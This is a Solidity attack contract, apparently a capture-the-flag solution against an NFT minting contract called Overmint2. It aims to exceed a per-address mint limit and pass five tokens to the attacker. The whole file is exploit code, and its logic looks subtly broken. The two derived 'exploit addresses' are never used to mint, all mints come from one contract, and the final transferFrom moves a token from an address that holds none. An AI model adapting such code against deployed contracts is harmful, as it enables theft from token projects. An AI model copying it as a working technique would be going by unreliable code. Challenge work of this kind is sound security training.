// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;

import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "../Overmint2.sol";

contract AttackContract is IERC721Receiver {
    Overmint2 public target;
    address public attacker;

    constructor(address _target) {
        target = Overmint2(_target);
        attacker = msg.sender;
    }

    function exploit() external {
        // Mint from multiple addresses to bypass limit
        address[2] memory exploitAddresses = [
            address(uint160(uint256(keccak256(abi.encodePacked(address(this), uint256(0)))))),
            address(uint160(uint256(keccak256(abi.encodePacked(address(this), uint256(1))))))
        ];

        // Mint 4 NFTs from first address
        for (uint256 i = 0; i < 4; i++) {
            (bool success, ) = address(target).call(
                abi.encodeWithSignature("mint()")
            );
            require(success, "Mint failed");
        }

        // Mint 1 NFT from second address
        (bool success, ) = address(target).call{value: 0}(
            abi.encodeWithSelector(bytes4(keccak256("mint()"))
        ));
        require(success, "Second mint failed");

        // Transfer final NFT to attacker
        target.transferFrom(exploitAddresses[1], attacker, 5);
    }

    function onERC721Received(
        address, 
        address, 
        uint256, 
        bytes calldata
    ) external pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}